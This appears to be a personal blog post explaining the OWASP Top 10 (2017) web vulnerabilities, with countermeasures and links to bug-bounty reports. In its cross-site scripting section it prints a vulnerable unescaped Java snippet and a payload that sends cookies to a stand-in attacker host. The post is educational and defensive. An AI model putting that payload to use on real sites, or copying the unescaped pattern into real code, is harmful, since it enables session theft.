<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>OWASP TOP 10(2017) &#183; Alex's Blog</title><link rel=stylesheet href=/posts/css/style.css><link rel=stylesheet href=/posts/css/fonts.css><link rel=icon href=favicon.ico><link rel=icon type=image/png sizes=32x32 href=/posts/images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/posts/images/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/posts/images/apple-touch-icon.png><link href rel=alternate type=application/rss+xml title="Alex's Blog"></head><body><nav class=nav><div class=nav-container><a href=/posts/><h2 class=nav-title>Alex's Blog</h2></a><ul></ul></div></nav><main><div class=post><div class=post-info><span>Written by</span>
Alex<br><span>on&nbsp;</span><time datetime="2019-09-21 17:21:11 +1100 +1100">September 21, 2019</time></div><h1 class=post-title>OWASP TOP 10(2017)</h1><div class=post-line></div><p><a href=https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf>OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks</a> summarizes the ten most likely, common, and dangerous vulnerabilities in web applications. Although it has been two years since the report was released, it is still very meaningful for introducing web security. Especially for engineers who are new to web security, this report is a very good guide that can help IT companies and development teams standardize the application development process and testing process, and improve the security of web products. This article will classify and analyze these vulnerability types and provide some of my personal opinions.</p><h2 id=category-1-no-user-input-validation>Category 1: No User Input Validation</h2><h3 id=a1-injection>A1: Injection</h3><p>In web security, injection is the most common and often the most impactful vulnerability. This includes SQL, NoSQL, OS, and LDAP injection, among others. These vulnerabilities are generally caused by a lack of validation of user input, with database injection being the most common. As a web application, many third-party services (such as databases, caches, system calls, etc.) are relied upon to implement specific functionality. When calling these services in web applications, commands are often sent to these services. If user input is not validated, it is easy for users to modify these commands and achieve the goal of calling other unintended commands.</p><p><strong>Related Cases</strong></p><p><a href=https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870>RCE with Flask Jinja Template Injection</a>
<a href=https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/>H1-4420: From Quiz to Admin - Chaining Two 0-Days to Compromise An Uber Wordpress</a></p><h3 id=a4-xml-external-entity-injection-xxe>A4: XML External Entity Injection (XXE)</h3><p>This vulnerability primarily occurs during parsing of XML. These vulnerabilities typically appear in some web services that support SOAP, where the server needs to analyze requests in XML format. The OWASP recommends the following countermeasures for this vulnerability:</p><p>Use simple JSON requests whenever possible.
Use secure XML parsers and upgrade SOAP to SOAP1.2 or higher.
Validate requests (e.g., using whitelisting).</p><p><strong>Related cases</strong></p><p><a href=https://medium.com/@mrnikhilsri/oob-xxe-in-prizmdoc-cve-2018-15805-dfb1e474345c>OOB XXE in PrizmDoc (CVE-2018â€“15805)</a></p><h3 id=a7-cross-site-scripting-xss>A7: Cross-site scripting (XSS)</h3><p>Unlike A1&rsquo;s backend service injection, XSS is an injection into the client-side web page, with the main target being the client-side. Common types of XSS injection include:</p><ol><li>Stored XSS (injecting code that is saved to the database).</li><li>Reflected XSS (injecting code that is not saved to the backend, but is directly displayed on the webpage).<pre><code class="language-js=" data-lang="js=">(String)page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; 
+ request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;
// Attackers can inject code by modifying the 'CC' parameter in the browser, 
// in order to steal cookies
&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+docuement.cookie&lt;/script&gt;'
</code></pre></li><li>DOM-based XSS (usually occurs in single-page applications where user-controlled data is injected).</li></ol><p>OWASP&rsquo;s recommended responses to this type of vulnerability include:</p><ol><li>Use the XSS protection provided by the framework and understand the framework&rsquo;s XSS protection measures.</li><li>Validate user-controlled data and remove dangerous symbols.</li><li>Use CSP.</li></ol><p><strong>Related Cases</strong></p><ul><li><a href=https://hackerone.com/reports/256152>Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains</a></li><li><a href=https://hackerone.com/reports/129582>Reflected XSS POST method at partners.uber.com</a></li><li><a href=https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/>How a classical XSS can lead to persistent ATO Vulnerability?</a></li></ul><h3 id=a8-insecure-deserialization-vulnerability>A8: Insecure Deserialization Vulnerability</h3><p>This type of vulnerability is similar to XXE (XML External Entity) attacks. Deserialization is a process of converting data from a string to an object in memory. It involves parsing and constructing objects in memory, almost like a simplified interpreter interpreting code. As you can imagine, many problems can occur during this process. The following are the recommended countermeasures for this vulnerability according to OWASP:</p><ol><li>Avoid accepting serialized objects from external sources or only accept serialized objects of primitive data types.</li><li>If the above is not possible, consider the following methods:<ul><li>Use digital signatures for integrity checking.</li><li>Perform strict type checking after deserialization.</li><li>Isolate the deserialization process and run it in a low-privileged environment.</li><li>Record deserialization exceptions.</li><li>Limit and record the containers or servers that transmit deserialization.</li><li>Monitor deserialization and alert users who frequently call deserialization.</li></ul></li></ol><p><strong>Related Cases</strong></p><ul><li><a href=https://hackerone.com/reports/502758>RCE and Complete Server Takeover of http://www.***.starbucks.com.sg/</a></li><li><a href=https://hackerone.com/reports/162199>Lack of payment type validation in dial.uber.com allows for free rides</a></li></ul><h2 id=category-2-the-cost-of-obtaining-illegal-informationfunction-is-too-low>Category 2: The cost of obtaining illegal information/function is too low</h2><h3 id=a2-invalid-identity-authentication-and-session-management>A2: Invalid Identity Authentication and Session Management</h3><p>Identity authentication is a very important and basic function in web services. However, it is not as easy to do well as one might think. Even Instagram recently had vulnerabilities in authentication. According to OWASP, common vulnerabilities in identity authentication include:</p><ol><li>Allowing attackers to automatically log in to a large number of accounts for testing</li><li>Allowing attackers to automatically exhaustively test a single account&rsquo;s login credentials</li><li>Exposing session IDs in URLs</li><li>Session IDs not being changed or invalidated</li></ol><p>These vulnerabilities all have a common characteristic: the threshold for information leakage is too low. In other words, attackers can obtain corresponding user (login) information at relatively low cost. Common defense measures include:</p><ol><li>Using multi-factor authentication (MFA) as much as possible</li><li>Not using simple initial passwords, especially for admin accounts</li><li>Not allowing users to create simple passwords to improve security</li><li>Increasing the cost for attackers to brute-force user accounts (such as adding CAPTCHAs, adding features to wait after failed logins)</li><li>Regularly changing session IDs</li></ol><p>It&rsquo;s not just a problem with login credential guessing, but also with CAPTCHA guessing. In short, any function related to verification should have measures to prevent exhaustive attacks.</p><h3 id=a3-sensitive-information-leakage>A3: Sensitive information leakage</h3><p>This type of vulnerability is mainly related to information storage and transmission. According to OWASP, vulnerabilities can occur when sensitive data (such as passwords) stored in a database is not encrypted, or is encrypted with weak encryption algorithms, especially when transmitted without HTTPS encryption.</p><p>Here, I would like to add an example I saw elsewhere. Website A is a stock announcement publishing website, and all announcements of listed trading companies must be published through this website on a regular basis. Mr. A is responsible for reviewing and publishing the company announcements. Because there are too many announcements to be published every day, Mr. A is accustomed to saving the announcements on the website first (at this point, the links have been generated but are not public), and then updating the link of the article on the website page at the scheduled time, so that everyone can access the announcement according to the public link. Mr. B is a stock trader who found that the links to the announcements were structured and that the links were accessible even before they were made public. So he wrote a script to download the announcements that had already generated links but had not yet been made public. This way, he could gain a huge information advantage by getting the latest stock information before the market, thereby gaining an edge.</p><p><strong>Related case</strong></p><ul><li><a href=https://hackerone.com/reports/419655>Client secret, server tokens for developer applications returned by internal API</a></li></ul><h3 id=a5-lack-of-function-level-access-control>A5: Lack of Function Level Access Control</h3><p>According to OWASP, incorrect access control by users is a common vulnerability. Since there is a lack of automated permission testing, manual testing is often necessary. OWASP recommends that all permission verification and access control must be done on the backend and that user input must be strictly validated.</p><p><strong>Related cases</strong></p><ul><li><a href=https://hackerone.com/reports/143717>Change any Uber user&rsquo;s password through /rt/users/passwordless-signup - Account Takeover (critical)</a></li><li><a href=https://hackerone.com/reports/541606>Shopify Admin &ndash; Permission from Settings to Customer</a></li></ul><h3 id=a6-configuration-error>A6: Configuration Error</h3><p>With the development of the web, various new technologies and tools have emerged like bamboo shoots after a spring rain. Many of these tools involve a lot of configuration, especially some default configurations, which can easily cause vulnerabilities if not configured properly. According to OWASP, there are generally several types of configuration errors:</p><ol><li>Failure to secure the tool&rsquo;s configuration</li><li>Failure to disable default accounts and passwords</li><li>Enabling unnecessary functionality</li><li>Returning error handling information to attackers</li><li>Using outdated and vulnerable software</li></ol><p>Programmers should have a basic understanding of the tools and technologies they use, especially the security configurations of the corresponding tools and the possible problems that may arise.</p><p><strong>Related cases</strong></p><ul><li><a href=https://hackerone.com/reports/268382>Nginx misconfiguration leading to direct PHP source code download</a></li><li><a href=https://hackerone.com/reports/202781>Chained Bugs to Leak Victim&rsquo;s Uber&rsquo;s FB Oauth Token</a></li><li><a href=https://hackerone.com/reports/206591>Open Redirect on central.uber.com allows for account takeover</a></li></ul><h2 id=category-three>Category Three:</h2><h3 id=a9-use-components-with-known-vulnerabilities>A9: Use components with known vulnerabilities</h3><p>This type of vulnerability is very common. Basically, when a component is found to have a vulnerability (0day), there is usually a period of time during which administrators need to patch it. In the past, many patches were applied manually, but now automation is generally required to reduce the attack window. If a vulnerability has been published for a long time, and even an exploit has been released, but the website has not been patched or the component has not been replaced, then the vulnerability will inevitably be exploited sooner or later. Take the bludkeep vulnerability as an example. This vulnerability was disclosed in March 2019, and just a few days ago an exploit that can cause code execution was released (<a href=https://github.com/rapid7/metasploit-framework/pull/12283)>https://github.com/rapid7/metasploit-framework/pull/12283)</a>. However, we can see from Shodan that there are still 200,000 servers in China alone that have not been patched.</p><p><img src=https://i.imgur.com/myZOqmL.png alt></p><p>This type of vulnerability is often exploited by malware and spreads quickly. Malware that mines cryptocurrency or carries out DDoS attacks, for example, loves this type of vulnerability. I previously wrote an analysis of malware that carries out DDoS attacks, which may be of interest to some.</p><h3 id=a10-insufficient-logging-and-monitoring-of-vulnerabilities>A10: Insufficient logging and monitoring of vulnerabilities</h3><p>At first glance, this may not seem related to vulnerabilities, because the lack of logging and monitoring does not directly lead to website breaches. However, upon closer inspection, the lack of monitoring and logging is indeed a significant security issue. Many attacks are stopped in a timely manner precisely because of monitoring and logging. Without monitoring, if a website is breached, it may go unnoticed, and hackers may even be able to stay on a company&rsquo;s network for several months without being detected. With monitoring and logging, even if a website has vulnerabilities that are exploited by hackers, the breach can be discovered as quickly as possible, and the losses can be minimized.</p><p>When it comes to logging and monitoring, there is also a special type of defense mechanism called a honeypot. Simply put, a vulnerable public server is deployed and observed through logging and monitoring to see how hackers penetrate and attack. By observing hackers' attack methods, better defense can be achieved.</p><h2 id=summary>Summary</h2><p>I think there are some measures that can be taken to mitigate these security issues.</p><ol><li>Identify and collect possible attack points (attack surface)</li><li>Identify the functions of the website and the corresponding resources needed</li><li>Consider the technology involved behind the attack surface (such as whether it requires querying a database, etc.)</li><li>Consider the possible implementation paths behind the attack surface (including exception handling paths).</li></ol></div><div class=pagination><a href=/posts/exploit/ class="left arrow">&#8592;</a>
<a href=/posts/architecture/ class="right arrow">&#8594;</a>
<a href=# class=top>Top</a></div></main><footer><span>&copy; <time datetime="2023-09-20 13:27:42.332063242 +0000 UTC m=+0.050046054">2023</time> Alex. Made with <a href=https://gohugo.io>Hugo</a> using the <a href=https://github.com/EmielH/tale-hugo/>Tale</a> theme.</span></footer></body></html>